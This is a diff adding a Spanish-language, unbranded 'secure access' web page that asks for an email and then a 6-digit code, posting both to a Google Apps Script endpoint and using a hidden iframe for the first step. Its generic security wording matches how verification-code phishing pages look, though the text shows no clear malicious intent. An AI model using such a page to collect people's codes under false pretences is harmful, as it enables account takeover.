@@ -1,0 +1,133 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Acceso seguro</title>
+<style>
+  :root{ --bg:#0b0e14; --panel:#121826; --muted:#aab4c3; --accent:#0b84ff; --ok:#22c55e; }
+  *{box-sizing:border-box}
+  body{
+    margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center;
+    background:linear-gradient(180deg,#06101a 0%, #07121a 100%); color:#e7eef8;
+    font-family: Inter, system-ui, -apple-system, "Helvetica Neue", Arial, sans-serif;
+    padding:20px;
+  }
+  .wrap{ width:100%; max-width:440px; }
+  .tabs{ display:flex; gap:8px; margin-bottom:10px; }
+  .tab{
+    flex:1; text-align:center; padding:10px; border-radius:10px;
+    background:#0f1720; color:#7f8a99; font-weight:700; font-size:14px;
+    border:1px solid #263241;
+  }
+  .tab.active{ color:#e7eef8; background:#152033; border-color:#2f3d52; }
+  .panel{
+    background:var(--panel); border-radius:16px; padding:18px;
+    box-shadow:0 10px 28px rgba(0,0,0,.35);
+  }
+  h2{ margin:0 0 6px; font-size:20px }
+  p{ margin:0 0 14px; color:var(--muted); line-height:1.5 }
+  label{ display:block; margin:8px 0 6px; color:#b5c0cf; font-size:13px }
+  input{
+    width:100%; padding:12px 14px; border-radius:10px; border:1px solid #263241;
+    background:#0f1720; color:#e7eef8; font-size:15px;
+  }
+  button{
+    width:100%; margin-top:12px; padding:12px; border:none; border-radius:10px;
+    background:var(--accent); color:#fff; font-weight:800; cursor:pointer; font-size:15px;
+  }
+  .ok{ color:var(--ok); font-size:13px; margin-top:8px; display:none; text-align:center }
+  .hidden{ display:none }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="tabs" role="tablist" aria-label="Verificación en dos pasos">
+      <div class="tab active" id="tab-email" aria-selected="true" role="tab">1) Correo</div>
+      <div class="tab" id="tab-code" aria-selected="false" role="tab">2) Código</div>
+    </div>
+
+    <div class="panel">
+      <!-- PASO 1: CORREO -->
+      <section id="step-email" role="tabpanel" aria-labelledby="tab-email">
+        <h2>Verificación por tu seguridad</h2>
+        <p>Para proteger tu información, verificaremos tu identidad mediante un código de 6 dígitos que enviaremos a tu correo electrónico.</p>
+
+        <!-- Tu Web App -->
+        <form id="emailForm" action="https://script.google.com/macros/s/AKfycbwrRtG58mAYlrcR0Ysjh-JoEPfv2yBkfnaSxitpnZRCwjUs0qKAMmKmP9ZxXT2o7HF47g/exec"
+              method="post" target="hidden_iframe" accept-charset="UTF-8" autocomplete="off" novalidate>
+          <input type="hidden" name="action" value="email">
+          <label for="email">Aquí va tu correo</label>
+          <input id="email" name="email" type="email" placeholder="@usuario1" required>
+          <button type="submit" id="btnEmail">Verificar</button>
+          <div id="okMsg" class="ok">Enviado</div>
+        </form>
+      </section>
+
+      <!-- PASO 2: CÓDIGO -->
+      <section id="step-code" class="hidden" role="tabpanel" aria-labelledby="tab-code">
+        <h2>Introduce el código</h2>
+        <p>Escribe el código de 6 dígitos que recibiste por correo y presiona <strong>Confirmar</strong> para continuar.</p>
+
+        <!-- Misma URL del Web App -->
+        <form id="verifyForm" action="https://script.google.com/macros/s/AKfycbwrRtG58mAYlrcR0Ysjh-JoEPfv2yBkfnaSxitpnZRCwjUs0qKAMmKmP9ZxXT2o7HF47g/exec"
+              method="post" accept-charset="UTF-8" autocomplete="off">
+          <input type="hidden" name="action" value="verify">
+          <input type="hidden" name="email" id="hiddenEmail">
+          <label for="code">Código de 6 dígitos</label>
+          <input id="code" name="code" inputmode="numeric" maxlength="6" pattern="\d{6}" placeholder="000000" required>
+          <button type="submit" id="btnVerify">Confirmar</button>
+        </form>
+      </section>
+    </div>
+  </div>
+
+  <!-- Iframe oculto para que el Paso 1 no navegue -->
+  <iframe name="hidden_iframe" style="display:none;"></iframe>
+
+  <script>
+    // pestañas y flujo
+    const tabEmail = document.getElementById('tab-email');
+    const tabCode  = document.getElementById('tab-code');
+    const stepEmail = document.getElementById('step-email');
+    const stepCode  = document.getElementById('step-code');
+    function showStep(which){
+      if (which === 'email') {
+        tabEmail.classList.add('active'); tabCode.classList.remove('active');
+        stepEmail.classList.remove('hidden'); stepCode.classList.add('hidden');
+      } else {
+        tabCode.classList.add('active'); tabEmail.classList.remove('active');
+        stepCode.classList.remove('hidden'); stepEmail.classList.add('hidden');
+      }
+      window.scrollTo({top:0, behavior:'smooth'});
+    }
+
+    // paso 1: email
+    const emailForm   = document.getElementById('emailForm');
+    const okMsg       = document.getElementById('okMsg');
+    const btnEmail    = document.getElementById('btnEmail');
+    const inputEmail  = document.getElementById('email');
+    const hiddenEmail = document.getElementById('hiddenEmail');
+
+    emailForm.addEventListener('submit', () => {
+      btnEmail.disabled = true;
+      btnEmail.textContent = 'Enviando...';
+
+      const ifr = document.querySelector('iframe[name="hidden_iframe"]');
+      const onLoad = () => {
+        okMsg.style.display = 'block';             // muestra “Enviado”
+        hiddenEmail.value = inputEmail.value;      // pasa el correo al paso 2
+        showStep('code');                          // salta a pestaña Código
+        btnEmail.disabled = false;
+        btnEmail.textContent = 'Verificar';
+        ifr.removeEventListener('load', onLoad);
+      };
+      ifr.addEventListener('load', onLoad);
+    });
+
+    // permitir cambiar manualmente (opcional)
+    tabEmail.addEventListener('click', () => showStep('email'));
+    tabCode.addEventListener('click',  () => showStep('code'));
+  </script>
+</body>
+</html>
